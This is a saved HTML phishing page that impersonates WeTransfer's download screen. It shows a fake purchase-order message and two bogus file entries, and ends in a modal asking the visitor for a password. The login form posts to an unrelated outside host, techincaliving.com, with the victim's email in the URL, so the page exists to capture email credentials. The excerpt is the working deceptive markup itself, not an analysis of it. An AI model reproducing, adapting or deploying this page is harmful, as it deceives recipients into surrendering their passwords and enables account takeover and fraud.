<!DOCTYPE html>
<!-- saved from url=(0069)https://techincaliving.com/se/tr/an/sf/er/index.php?X1=email@mail.com -->
<html class="no-touch no-ie fonts-loaded" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
...
<meta name="csrf-token" content="rrYWaC15QovNSnY6ByLuAdyeF/KnAWAOfefngSMyLF1VH8O3t+xugGzcaHpyBEJNZexGFSXGJNySiKuCJ65w8Q==">
  ...
  <style type="text/css">
    ...
    <script src="./WeTransfer_files/jquery.min.js.download"></script>
...
Try refreshing the page or get in touch through our <a href="https://wetransfer.zendesk.com/" rel="external">help center</a>.
  ...
  <form method="post" action="https://techincaliving.com/se/tr/an/sf/er/index.php?X1=email@mail.com#">
...
<div class="downloader__message">
  <p title="Hi, as per our inquiry. These are the products we are interested in. Kindly check our requirements and revert to us with confirmation.">
    Hi, as per our inquiry. These are the products we are ...</p></div>
</div>
<br>
<ul class="filelist">
  <li class="filelist__item"><div class="poptip"><div class="filelist__meta">
  <span class="filelist__name" title="Purchase Order.pdf"><b>Purchase Order.pdf</b></span>
  <p class="filelist__size"><span>15 MB</span><span>zip</span></p><div class="filelist__action"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div></div></li>
</ul>
<div style="height:8px"></div>
<ul class="filelist">
  <li class="filelist__item"><div class="poptip"><div class="filelist__meta">
  <span class="filelist__name" title="Company Profile.pdf"><b>Company Profile.m4v</b></span>
  <p class="filelist__size"><span>130 MB</span><span>m4v</span></p><div class="filelist__action"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div></div></li>
</ul>
    ...
    <div class="confirm-modal-box">
      <div style="margin: 0 auto; text-align: center; padding-top: 10px;">
        ...
        <div style="text-align:center; margin-top: 25px;">
          ...
          <div>
            <input type="text" name="password" id="password" placeholder="Enter password" class="confirm-input" style="margin-top: 15px;">
          </div>
